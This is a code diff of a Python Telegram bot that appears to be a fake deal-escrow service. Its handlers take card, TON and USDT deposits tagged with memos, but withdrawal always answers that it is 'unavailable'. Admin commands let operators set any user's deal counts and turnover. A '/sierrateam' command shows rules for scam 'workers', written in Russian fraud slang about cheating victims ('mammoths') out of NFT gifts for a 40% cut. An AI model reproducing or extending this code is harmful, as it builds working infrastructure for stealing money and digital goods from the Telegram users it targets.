+            "✅ Example: select «To card → RUB» and enter 1000 — bot will tell you how much to top up.",
+            read_keyboard_en)
 
 @dp.callback_query(F.data == "read_deposit")
 async def read_deposit_callback(callback: CallbackQuery):
@@ -1152,17 +1079,9 @@ async def read_deposit_callback(callback: CallbackQuery):
         return
     lang = user_languages.get(callback.from_user.id, "ru")
     if lang == "ru":
-        await safe_edit_message(
-            callback,
-            "💰 Пополнение баланса\n\nВыберите способ — бот автоматически рассчитает, сколько TON или же USDT нужно для пополнения.",
-            deposit_method_keyboard_ru
-        )
+        await safe_edit_message(callback, "💰 Пополнение баланса\n\nВыберите способ:", deposit_method_keyboard_ru)
     else:
-        await safe_edit_message(
-            callback,
-            "💰 Balance top-up\n\nChoose method — the bot will automatically calculate how much TON or USDT is needed for top-up.",
-            deposit_method_keyboard_en
-        )
+        await safe_edit_message(callback, "💰 Balance top-up\n\nChoose method:", deposit_method_keyboard_en)
 
 @dp.callback_query(F.data == "deposit_card")
 async def deposit_card_callback(callback: CallbackQuery):
@@ -1172,21 +1091,9 @@ async def deposit_card_callback(callback: CallbackQuery):
     memo = generate_memo()
     lang = user_languages.get(callback.from_user.id, "ru")
     if lang == "ru":
-        await safe_edit_message(
-            callback,
-            f"💳 {MANAGER_CARD}\n"
-            f"Переводите точную сумму и не забывайте мемо комментарий\n\n"
-            f"📝 Memo: `{memo}`",
-            back_simple_keyboard_ru
-        )
+        await safe_edit_message(callback, f"💳 {MANAGER_CARD}\nПереводите точную сумму и не забывайте мемо комментарий\n\n📝 Memo: `{memo}`", back_simple_keyboard_ru)
     else:
-        await safe_edit_message(
-            callback,
-            f"💳 {MANAGER_CARD}\n"
-            f"Transfer the exact amount and don't forget the memo comment\n\n"
-            f"📝 Memo: `{memo}`",
-            back_simple_keyboard_en
-        )
+        await safe_edit_message(callback, f"💳 {MANAGER_CARD}\nTransfer the exact amount and don't forget the memo comment\n\n📝 Memo: `{memo}`", back_simple_keyboard_en)
 
 @dp.callback_query(F.data == "deposit_ton")
 async def deposit_ton_callback(callback: CallbackQuery):
@@ -1196,21 +1103,9 @@ async def deposit_ton_callback(callback: CallbackQuery):
     memo = generate_memo()
     lang = user_languages.get(callback.from_user.id, "ru")
     if lang == "ru":
-        await safe_edit_message(
-            callback,
-            f"💎 TON кошелек для пополнения:\n`{TON_WALLET}`\n\n"
-            f"Не забудьте указать точную сумму и мемо комментарий\n\n"
-            f"📝 Memo: `{memo}`",
-            back_simple_keyboard_ru
-        )
+        await safe_edit_message(callback, f"💎 TON кошелек:\n`{TON_WALLET}`\n\nНе забудьте мемо комментарий\n📝 Memo: `{memo}`", back_simple_keyboard_ru)
     else:
-        await safe_edit_message(
-            callback,
-            f"💎 TON wallet for top-up:\n`{TON_WALLET}`\n\n"
-            f"Don't forget to specify the exact amount and memo comment\n\n"
-            f"📝 Memo: `{memo}`",
-            back_simple_keyboard_en
-        )
+        await safe_edit_message(callback, f"💎 TON wallet:\n`{TON_WALLET}`\n\nDon't forget memo comment\n📝 Memo: `{memo}`", back_simple_keyboard_en)
 
 @dp.callback_query(F.data == "deposit_usdt")
 async def deposit_usdt_callback(callback: CallbackQuery):
@@ -1220,42 +1115,23 @@ async def deposit_usdt_callback(callback: CallbackQuery):
     memo = generate_memo()
     lang = user_languages.get(callback.from_user.id, "ru")
     if lang == "ru":
-        await safe_edit_message(
-            callback,
-            f"💵 USDT кошелек для пополнения:\n`{USDT_WALLET}`\n\n"
-            f"Не забудьте указать точную сумму и мемо комментарий\n\n"
-            f"📝 Memo: `{memo}`",
-            back_simple_keyboard_ru
-        )
+        await safe_edit_message(callback, f"💵 USDT кошелек (TRC-20):\n`{USDT_WALLET}`\n\nНе забудьте мемо комментарий\n📝 Memo: `{memo}`", back_simple_keyboard_ru)
     else:
-        await safe_edit_message(
-            callback,
-            f"💵 USDT wallet for top-up:\n`{USDT_WALLET}`\n\n"
-            f"Don't forget to specify the exact amount and memo comment\n\n"
-            f"📝 Memo: `{memo}`",
-            back_simple_keyboard_en
-        )
+        await safe_edit_message(callback, f"💵 USDT wallet (TRC-20):\n`{USDT_WALLET}`\n\nDon't forget memo comment\n📝 Memo: `{memo}`", back_simple_keyboard_en)
 
 @dp.callback_query(F.data == "withdraw")
 async def withdraw_callback(callback: CallbackQuery):
     if callback.from_user.id in banned_users:
         await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
         return
-    user_id = callback.from_user.id
-    balance = user_balances.get(user_id, 0)
-    lang = user_languages.get(user_id, "ru")
+    lang = user_languages.get(callback.from_user.id, "ru")
+    balance = user_balances.get(callback.from_user.id, 0)
     if balance <= 0:
-        if lang == "ru":
-            await callback.answer("❌ Нет средств для вывода", show_alert=True)
-        else:
-            await callback.answer("❌ No funds to withdraw", show_alert=True)
+        await callback.answer("❌ Нет средств для вывода" if lang == "ru" else "❌ No funds to withdraw", show_alert=True)
     else:
-        if lang == "ru":
-            await callback.answer("❌ К сожалению вывод сейчас недоступен", show_alert=True)
-        else:
-            await callback.answer("❌ Unfortunately withdrawal is currently unavailable", show_alert=True)
+        await callback.answer("❌ К сожалению вывод сейчас недоступен" if lang == "ru" else "❌ Unfortunately withdrawal is currently unavailable", show_alert=True)
 
-# =========== РЕКВИЗИТЫ ===========
+# ========== РЕКВИЗИТЫ ==========
 @dp.callback_query(F.data == "requisites")
 async def requisites_callback(callback: CallbackQuery):
     if callback.from_user.id in banned_users:
@@ -1263,17 +1139,9 @@ async def requisites_callback(callback: CallbackQuery):
         return
     lang = user_languages.get(callback.from_user.id, "ru")
     if lang == "ru":
-        await safe_edit_message(
-            callback,
-            "⚙️ Управление реквизитами\n\nВыберите одну из предложенных ниже опций:",
-            requisites_keyboard_ru
-        )
+        await safe_edit_message(callback, "⚙️ Управление реквизитами\n\nВыберите одну из предложенных ниже опций:", requisites_keyboard_ru)
     else:
-        await safe_edit_message(
-            callback,
-            "⚙️ Payment details management\n\nChoose one of the options below:",
-            requisites_keyboard_en
-        )
+        await safe_edit_message(callback, "⚙️ Payment details management\n\nChoose one of the options below:", requisites_keyboard_en)
 
 @dp.callback_query(F.data == "add_card")
 async def add_card_callback(callback: CallbackQuery):
@@ -1282,17 +1150,9 @@ async def add_card_callback(callback: CallbackQuery):
         return
     lang = user_languages.get(callback.from_user.id, "ru")
     if lang == "ru":
-        await safe_edit_message(
-            callback,
-            "💳 Добавить реквизиты карты\n\nПожалуйста, отправьте реквизиты вашей карты в формате:\nНазвание банка - Номер карты\nПример: `ВТБ - 89041751408`",
-            back_simple_keyboard_ru
-        )
+        await safe_edit_message(callback, "💳 Добавить реквизиты карты\n\nФормат:\nНазвание банка - Номер карты\nПример: `ВТБ - 89041751408`", back_simple_keyboard_ru)
     else:
-        await safe_edit_message(
-            callback,
-            "💳 Add card details\n\nPlease send your card details in the format:\nBank name - Card number\nExample: `VTB - 89041751408`",
-            back_simple_keyboard_en
-        )
+        await safe_edit_message(callback, "💳 Add card details\n\nFormat:\nBank name - Card number\nExample: `VTB - 89041751408`", back_simple_keyboard_en)
 
 @dp.callback_query(F.data == "add_ton")
 async def add_ton_callback(callback: CallbackQuery):
@@ -1301,17 +1161,9 @@ async def add_ton_callback(callback: CallbackQuery):
         return
     lang = user_languages.get(callback.from_user.id, "ru")
     if lang == "ru":
-        await safe_edit_message(
-            callback,
-            "💎 Добавить TON кошелек\n\nПожалуйста, отправьте адрес вашего TON кошелька:\nПример: `UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc`",
-            back_simple_keyboard_ru
-        )
+        await safe_edit_message(callback, "💎 Добавить TON кошелек\n\nПример: `UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc`", back_simple_keyboard_ru)
     else:
-        await safe_edit_message(
-            callback,
-            "💎 Add TON wallet\n\nPlease send your TON wallet address:\nExample: `UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc`",
-            back_simple_keyboard_en
-        )
+        await safe_edit_message(callback, "💎 Add TON wallet\n\nExample: `UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc`", back_simple_keyboard_en)
 
 @dp.callback_query(F.data == "add_usdt")
 async def add_usdt_callback(callback: CallbackQuery):
@@ -1320,70 +1172,37 @@ async def add_usdt_callback(callback: CallbackQuery):
         return
     lang = user_languages.get(callback.from_user.id, "ru")
     if lang == "ru":
-        await safe_edit_message(
-            callback,
-            "💵 Добавить USDT кошелек\n\nПожалуйста, отправьте адрес вашего USDT кошелька (TRC-20):\nПример: `TJjAD8rR7yFb84F1boTKr6mRKJvLhNR9p1`",
-            back_simple_keyboard_ru
-        )
+        await safe_edit_message(callback, "💵 Добавить USDT кошелек (TRC-20)\n\nПример: `TJjAD8rR7yFb84F1boTKr6mRKJvLhNR9p1`", back_simple_keyboard_ru)
     else:
-        await safe_edit_message(
-            callback,
-            "💵 Add USDT wallet\n\nPlease send your USDT wallet address (TRC-20):\nExample: `TJjAD8rR7yFb84F1boTKr6mRKJvLhNR9p1`",
-            back_simple_keyboard_en
-        )
+        await safe_edit_message(callback, "💵 Add USDT wallet (TRC-20)\n\nExample: `TJjAD8rR7yFb84F1boTKr6mRKJvLhNR9p1`", back_simple_keyboard_en)
 
 @dp.callback_query(F.data == "view_requisites")
 async def view_requisites_callback(callback: CallbackQuery):
     if callback.from_user.id in banned_users:
         await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
         return
-
     user_id = callback.from_user.id
     requisites = user_requisites.get(user_id, {})
     lang = user_languages.get(user_id, "ru")
-
     if not requisites:
-        if lang == "ru":
-            await safe_edit_message(callback, "✖ Реквизиты не найдены.", back_simple_keyboard_ru)
-        else:
-            await safe_edit_message(callback, "✖ Details not found.", back_simple_keyboard_en)
+        await safe_edit_message(callback, "✖ Реквизиты не найдены." if lang == "ru" else "✖ Details not found.", back_simple_keyboard_ru if lang == "ru" else back_simple_keyboard_en)
     else:
-        if lang == "ru":
-            text = "💳 Ваши реквизиты\n\n"
-        else:
-            text = "💳 Your details\n\n"
-
+        text = "💳 Ваши реквизиты\n\n" if lang == "ru" else "💳 Your details\n\n"
         if "card" in requisites:
             text += f"💳 Карта: `{requisites['card']}`\n"
         if "ton" in requisites:
             text += f"💎 TON: `{requisites['ton']}`\n"
         if "usdt" in requisites:
             text += f"💵 USDT: `{requisites['usdt']}`\n"
+        await safe_edit_message(callback, text, back_simple_keyboard_ru if lang == "ru" else back_simple_keyboard_en)
 
-        if lang == "ru":
-            await safe_edit_message(callback, text, back_simple_keyboard_ru)
-        else:
-            await safe_edit_message(callback, text, back_simple_keyboard_en)
-
-# =========== ЯЗЫК ===========
+# ========== ЯЗЫК ==========
 @dp.callback_query(F.data == "change_language")
 async def change_language_callback(callback: CallbackQuery):
     if callback.from_user.id in banned_users:
         await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
         return
-    lang = user_languages.get(callback.from_user.id, "ru")
-    if lang == "ru":
-        await safe_edit_message(
-            callback,
-            "🌐 Изменить язык\n\nВыберите предпочитаемый язык:",
-            language_keyboard
-        )
-    else:
-        await safe_edit_message(
-            callback,
-            "🌐 Change language\n\nChoose your preferred language:",
-            language_keyboard
-        )
+    await safe_edit_message(callback, "🌐 Выберите язык / Choose language:", language_keyboard)
 
 @dp.callback_query(F.data == "lang_ru")
 async def lang_ru_callback(callback: CallbackQuery):
@@ -1401,10 +1220,10 @@ async def lang_en_callback(callback: CallbackQuery):
     user_languages[callback.from_user.id] = "en"
     await send_main_menu(callback.message.chat.id, "en", callback.message.message_id)
 
-######## ОБРАБОТЧИКИ АДМИН-КЛАВИАТУРЫ ########
+# ========== ADMIN CALLBACKS ==========
 @dp.callback_query(F.data == "ban_user")
 async def ban_user_callback(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
+    if not is_admin(callback.from_user.id):
         await callback.answer("✖ У вас нет доступа к этой функции", show_alert=True)
         return
     admin_states[callback.from_user.id] = "waiting_ban_id"
@@ -1412,47 +1231,46 @@ async def ban_user_callback(callback: CallbackQuery):
 
 @dp.callback_query(F.data == "send_money")
 async def send_money_callback(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
+    if not is_admin(callback.from_user.id):
         await callback.answer("✖ У вас нет доступа к этой функции", show_alert=True)
         return
     admin_states[callback.from_user.id] = "waiting_send_money"
-    await safe_edit_message(callback, "Введите ID пользователя и сумму для перевода в формате: ID СУММА")
+    await safe_edit_message(callback, "Введите ID пользователя и сумму: ID СУММА")
 
 @dp.callback_query(F.data == "set_successful_deals")
 async def set_successful_deals_callback(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
+    if not is_admin(callback.from_user.id):
         await callback.answer("✖ У вас нет доступа к этой функции", show_alert=True)
         return
     admin_states[callback.from_user.id] = "waiting_successful_deals"
-    await safe_edit_message(callback, "Введите ID пользователя и количество успешных сделок в формате: ID КОЛИЧЕСТВО")
+    await safe_edit_message(callback, "Введите ID пользователя и количество: ID КОЛИЧЕСТВО")
 
 @dp.callback_query(F.data == "set_total_deals")
 async def set_total_deals_callback(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
+    if not is_admin(callback.from_user.id):
         await callback.answer("✖ У вас нет доступа к этой функции", show_alert=True)
         return
     admin_states[callback.from_user.id] = "waiting_total_deals"
-    await safe_edit_message(callback, "Введите ID пользователя и общее количество сделок в формате: ID КОЛИЧЕСТВО")
+    await safe_edit_message(callback, "Введите ID пользователя и количество: ID КОЛИЧЕСТВО")
 
 @dp.callback_query(F.data == "set_turnover")
 async def set_turnover_callback(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
+    if not is_admin(callback.from_user.id):
         await callback.answer("✖ У вас нет доступа к этой функции", show_alert=True)
         return
-
     admin_states[callback.from_user.id] = "waiting_turnover"
-    await safe_edit_message(callback, "Введите ID пользователя и оборот в формате: ID СУММА")
+    await safe_edit_message(callback, "Введите ID пользователя и оборот: ID СУММА")
 
 # ========== БАННЕР ==========
 @dp.message(Command("setbanner"))
 async def set_banner_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     await message.answer("🖼 Отправьте фото для баннера")
 
 @dp.message(F.photo)
 async def save_banner(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     try:
         file_id = message.photo[-1].file_id
@@ -1464,7 +1282,7 @@ async def save_banner(message: Message):
 
 @dp.message(Command("removebanner"))
 async def remove_banner_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     try:
         if os.path.exists("banner.jpg"):
@@ -1475,18 +1293,20 @@ async def remove_banner_command(message: Message):
     except:
         await message.answer("❌ Ошибка при удалении")
 
-######## SIERRATEAM ########
+# ========== SIERRATEAM ==========
 @dp.message(Command("sierrateam"))
 async def sierrateam_command(message: Message):
     user_id = message.from_user.id
     if user_id in banned_users:
         await message.answer("✖ Вы были заблокированы в боте")
         return
-    await message.answer("Прежде чем начать воркать через бота - прочитай правила:\n\n"
-                         "1. Наебал на нфт - ЕСЛИ ТЫ НАПИСАЛ МАМОНТУ КИНУТЬ ГИФТ ТЕБЕ А НЕ МЕНЕДЖЕРУ - БАН. (Если мамонт кинул нфт тебе сам, либо 40% в течении дня, либо кидаешь гифт на акк менеджеру, либо бан.\n\n"
-                         "2. Наебал на брейнрота - 40% от стоимости в течении дня, иначе бан\n\n"
-                         "3. Не прочитал правила - твои проблемы",
-                         reply_markup=sierrateam_keyboard)
+    await message.answer(
+        "Прежде чем начать воркать через бота - прочитай правила:\n\n"
+        "1. Наебал на нфт — ЕСЛИ ТЫ НАПИСАЛ МАМОНТУ КИНУТЬ ГИФТ ТЕБЕ А НЕ МЕНЕДЖЕРУ — БАН.\n\n"
+        "2. Наебал на брейнрота — 40% от стоимости в течении дня, иначе бан\n\n"
+        "3. Не прочитал правила — твои проблемы",
+        reply_markup=sierrateam_keyboard
+    )
 
 @dp.callback_query(F.data == "sierrateam_read")
 async def sierrateam_read_callback(callback: CallbackQuery):
@@ -1495,7 +1315,10 @@ async def sierrateam_read_callback(callback: CallbackQuery):
         return
     await safe_edit_message(
         callback,
-        "Админ-панель\n\nВыберите действие:\n\n Полный доступ: ✖ Отсутствует\n Может подтверждать: Только подарки\n\n Для получения полного доступа свяжитесь с @ManagerDealsPlayer",
+        "Админ-панель\n\nВыберите действие:\n\n"
+        "Полный доступ: ✖ Отсутствует\n"
+        "Может подтверждать: Только подарки\n\n"
+        "Для получения полного доступа свяжитесь с @ManagerDealsPlayer",
         reply_markup=admin_keyboard
     )
 
@@ -1503,7 +1326,7 @@ async def sierrateam_read_callback(callback: CallbackQuery):
 async def main():
     print("✅ Бот запущен!")
     print(f"🤖 Бот: @{BOT_USERNAME}")
-    print(f"👑 Админ ID: {ADMIN_ID}")
+    print(f"👑 Админ IDs: {ADMIN_IDS}")
     print(f"👤 Менеджер: @{MANAGER_USERNAME}")
     await dp.start_polling(bot)
 
